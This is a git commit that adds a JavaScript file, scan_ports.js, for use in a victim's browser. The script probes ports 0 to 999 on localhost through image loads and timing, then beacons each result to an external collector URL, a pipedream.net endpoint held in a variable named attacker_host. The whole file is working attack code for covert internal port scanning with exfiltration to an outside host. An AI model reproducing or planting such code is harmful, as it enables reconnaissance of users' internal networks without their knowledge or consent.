052f592c02d0806084d77a95b268c3e6d4b17083
Lam Nguyen <60765640+kiven7299@users.noreply.github.com>
2021-04-09 12:02:04 +0700

    Create scan_ports.js

---
+++ JS/scan_ports.js
@@ -0,0 +1,34 @@
+var call_back = function (port, status, exfil_host=attacker_host) {
+	let img = document.createElement("img");
+        img.src = `${exfil_host}/port-${port}-openned`
+}
+
+var check_port = function (target, port, timeout, callback=call_back) {
+	
+	var timeout = (timeout == null)?100:timeout;
+	var img = new Image();
+	
+	img.onerror = function () {
+		if (!img) return;
+		img = undefined;
+		callback(port, 'open');
+	};
+	
+	img.onload = img.onerror;
+	img.src = 'http://' + target + ':' + port;
+	
+	setTimeout(function () {
+		if (!img) return;
+		img = undefined;
+		callback(port, 'closed');
+	}, timeout);
+};
+
+
+var target = 'localhost'
+var attacker_host = 'https://a4e8f8fdfa71d7509998751717b20e35.m.pipedream.net'
+
+// usage
+for(let i=0; i<1000; i++) {
+    check_port('localhost', i, 2);
+}
